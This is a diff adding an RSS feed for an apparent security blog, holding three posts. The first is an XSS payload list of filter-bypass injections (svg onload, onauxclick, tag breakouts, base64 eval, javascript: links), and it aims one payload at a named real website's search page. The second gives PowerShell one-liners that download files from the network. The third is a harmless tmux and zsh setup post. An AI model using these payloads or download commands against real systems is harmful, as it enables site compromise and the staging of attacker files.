@@ -1,0 +1,218 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>3ecurity</title>
+    <description></description>
+    <link>http://localhost:4000//</link>
+    <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Tue, 16 Apr 2019 09:12:44 +0800</pubDate>
+    <lastBuildDate>Tue, 16 Apr 2019 09:12:44 +0800</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>XSS Payload List</title>
+        <description>&lt;p&gt;Assume, the server filter ) and you want to bypass it then use:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg/onload=&quot;-alert(1)/**/&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;还可以在alert前面添加&lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;%0A&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;%0B&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;%0C&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;%0D&lt;/code&gt;来进行绕过。
+&lt;br /&gt;如果是反射型XSS，可以使用上述字符进行测试，如果是存储型XSS，使用&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;、来进行绕过。
+&lt;br /&gt;在html中并不是所有标签都需要闭合的，如&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;svg onload=alert(1)&lt;/code&gt;也是可以使用的。
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;号可以插入多个。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;-alert`1`,&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;E.g&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;window.location.replace(&quot;http://site.com?x=3site.com/?x=3 &quot;); 
+window.location.replace(&quot;http://site.com?x=3site.com/?x=3 &quot;-alert`1`,&quot;) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;will do the trick.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;b&quot;/onauxclick='-alert(1);'&amp;gt;Copy Me
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;XXS The payload will run in all the context. Eg - &lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;text&quot; value=&quot;&amp;lt;b&quot;/onauxclick='-alert(2);'&amp;gt;XXS&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt; var test='&amp;lt;b&quot;/onauxclick='-alert(3);'&amp;gt;TEST'; &amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;d3&quot;👉😎👈/onclick=&quot;1&amp;gt;[confirm`xss`]&quot;&amp;lt;&quot;😎&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;E.g&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://dramaonline.pk/search.php?q=&amp;lt;/title&amp;gt;&amp;lt;d3&quot;👉😎👈/onclick=&quot;1&amp;gt;[confirm`xss`]&quot;&amp;lt;&quot;😎&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;xmp&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;xmp&amp;gt;&amp;lt;p title=&quot;&amp;lt;/xmp&amp;gt;&amp;lt;svg/onload=alert(45)&amp;gt;”&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;noscript&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;noscript&amp;gt;&amp;lt;p title=&quot;&amp;lt;/noscript&amp;gt;&amp;lt;svg/onload=alert(45)&amp;gt;”&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;noframes&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;noframes&amp;gt;&amp;lt;p title=&quot;&amp;lt;/noframes&amp;gt;&amp;lt;svg/onload=alert(45)&amp;gt;”&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;iframe&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe&amp;gt;&amp;lt;p title=&quot;&amp;lt;/iframe&amp;gt;&amp;lt;svg/onload=alert(45)&amp;gt;&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;--`&amp;lt;img/src=` onerror=confirm`xss`&amp;gt; --!&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;--&amp;lt;img onerror=alert(1) src=a&amp;gt; --!&amp;gt;
+&amp;lt;--%253cimg%20onerror=alert(1)%20src=a%253e --!&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Data URI scheme&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;data:
+data:text/plain
+data:text/html
+data:text/html;base64
+data:text/css
+data:text/css;base64
+data:text/javascript
+data:text/javascript;base64
+data:image/gif;base64
+data:image/png;base64
+data:image/jpeg;base64
+data:image/x-icon;base64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;working IE/EDGE XSS payload&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;co\u006efir\u006d`1`&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg onload=1?alert(9):0&amp;gt;
+&amp;lt;svg onload=0?1:alert(9)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;AutoFocus后面的&lt;code class=&quot;highlighter-rouge&quot;&gt;*/;&lt;/code&gt;会被解析为&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;属性、&lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt;属性。所以这里还可以加上任意字符&lt;code class=&quot;highlighter-rouge&quot;&gt;a/b/c/&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;confirm&lt;/code&gt;也可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;\u&lt;/code&gt;进行编码。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hello&amp;lt;!'/*!&quot;/*!\'/*\&quot;/*--!&amp;gt;&amp;lt;Input/Type=Text AutoFocus */; OnFocus=(confirm)(document.domain) //&amp;gt;&amp;lt;Svg&amp;gt;#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe src=jaVaScrIpT:eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))&amp;gt;
+&amp;lt;sVg/oNloAd=&quot;JaVaScRiPt:/**/eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))&quot;&amp;gt;
+&amp;lt;sVG/ aa */(/ oNloAd=&quot;JaVaScRiPt:/**/eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))&quot;&amp;gt;
+&amp;lt;sVG/ aa */(/ oNloAd=&quot;JaVaScRiPt:/**/eval(atob('Y29uZ mly bShkb2N1b WVudC5 kb21haW4 pOw = = '))&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/*'/*`/*&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onmouseover=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/*&amp;amp;lt;svg/*/onload=alert(/xss/)//&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript://comment%0a%0dalert(/xss/);&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; Click Me&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Sun, 14 Apr 2019 18:00:00 +0800</pubDate>
+        <link>http://localhost:4000//blog/XSS-Payload-List/</link>
+        <guid isPermaLink="true">http://localhost:4000//blog/XSS-Payload-List/</guid>
+        
+        <category>XSS</category>
+        
+        <category>Payload</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>Windows Powershell Download File</title>
+        <description>&lt;h1 id=&quot;下载&quot;&gt;下载：&lt;/h1&gt;
+
+&lt;h3 id=&quot;1-netwebclient&quot;&gt;1. Net.WebClient&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command &quot;&amp;amp; {(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg', 'test1.jpg')}&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2-bitstransfer&quot;&gt;2. BitsTransfer&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command &quot;&amp;amp; {Import-Module BitsTransfer; Start-BitsTransfer 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' 'test2.jpg'}&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;3-invoke-webrequest-was-added-in-powershell-30&quot;&gt;3. Invoke-WebRequest (was added in PowerShell 3.0)&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command &quot;&amp;amp; {Invoke-WebRequest 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' -OutFile 'test3.jpg'}&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;4-iwr-alias-for-invoke-webrequest-since-powershell-30&quot;&gt;4. iwr (alias for Invoke-WebRequest since PowerShell 3.0)&lt;/h3&gt;
+
+&lt;p&gt;&lt;del&gt;powershell.exe -Command “&amp;amp; {(iwr https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg).Content &amp;gt; test4.jpg}”&lt;/del&gt;
+由于之前的命令是有问题的，经过google，正确用法如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell -command &quot;&amp;amp; { iwr https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg -OutFile test4.jpg }&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;5-wget-curl-aliases-for-invoke-webrequest-since-powershell-40&quot;&gt;5. wget, curl (aliases for Invoke-WebRequest since PowerShell 4.0)&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command &quot;&amp;amp; {wget 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' -OutFile 'test5.jpg'}&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command &quot;&amp;amp; {curl 'https://raw.githubusercontent.com/3ecurity/3ecurity.github.io/master/test.jpg' -OutFile 'test6.jpg'}&quot;&lt;/code&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 11 Apr 2019 18:00:00 +0800</pubDate>
+        <link>http://localhost:4000//blog/Windows-Powershell-Download-File/</link>
+        <guid isPermaLink="true">http://localhost:4000//blog/Windows-Powershell-Download-File/</guid>
+        
+        <category>Powershell</category>
+        
+        <category>Download</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>Arch Linux + Tmux = CLI++</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/posts/2017/01.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Caso queira ver o print maior, &lt;a href=&quot;/images/posts/2017/01.png&quot;&gt;clica aqui [0]&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Primeiro post do blog em 2017, logo no primeiro dia do ano, será que isso quer dizer alguma coisa? haha&lt;/p&gt;
+
+&lt;p&gt;Enfim, temos aqui um screenshot, algo que já queria postar há um tempo, mas enfim, está aqui agora. Nele tem aberto o filme “Lights Out” no Mplayer (\o/) e por trás o Tmux, com ZSH.&lt;/p&gt;
+
+&lt;p&gt;O Tmux é quase o padrão. No arquivo de configuração tem apenas o seguinte:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bind c new-window -c '#{pane_current_path}'
+bind '&quot;' split-window -c '#{pane_current_path}'
+bind % split-window -h -c '#{pane_current_path}'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Contribuição do &lt;a href=&quot;https://github.com/marinofull&quot;&gt;Marino&lt;/a&gt;, que serve para quando abrirmos um novo painel no Tmux, ele persistir o diretório do painel atual.&lt;/p&gt;
+
+&lt;p&gt;Já no ZSH eu utilizo o &lt;a href=&quot;http://ohmyz.sh/&quot;&gt;Oh-My-ZSH [1]&lt;/a&gt; com um tema bem simples que montei:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setopt promptsubst
+PROMPT=$'%B${(r:$COLUMNS::¨:)}$(git_prompt_info)%{$fg[white]%}&amp;gt;&amp;gt; %b%{$reset_color%}'
+RPROMPT='%B%*%b'
+
+ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%{$fg[white]%}&quot;
+ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%{$reset_color%} &quot;
+ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%{$fg[red]%} *%{$reset_color%}&quot;
+ZSH_THEME_GIT_PROMPT_CLEAN=&quot;&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;E lá ao fundo o wallpaper de gatênho! Aqui o link para ele: &lt;a href=&quot;/images/posts/2017/02.jpg&quot;&gt;Gatênho [2]&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Bom, tomara que começar o ano postando algo assim faça vir mais posts e coisas boas por aqui. Até a próxima, pessoal! o/&lt;/p&gt;
+
+&lt;h2 id=&quot;links&quot;&gt;Links&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0]: http://localhost:4000/images/posts/2017/01.png
+[1]: http://ohmyz.sh/
+[2]: http://localhost:4000/images/posts/2017/02.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Sun, 01 Jan 2017 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000//blog/arch-linux-tmux/</link>
+        <guid isPermaLink="true">http://localhost:4000//blog/arch-linux-tmux/</guid>
+        
+        <category>archlinux</category>
+        
+        <category>linux</category>
+        
+        <category>screenshot</category>
+        
+        <category>tmux</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+  </channel>
+</rss>
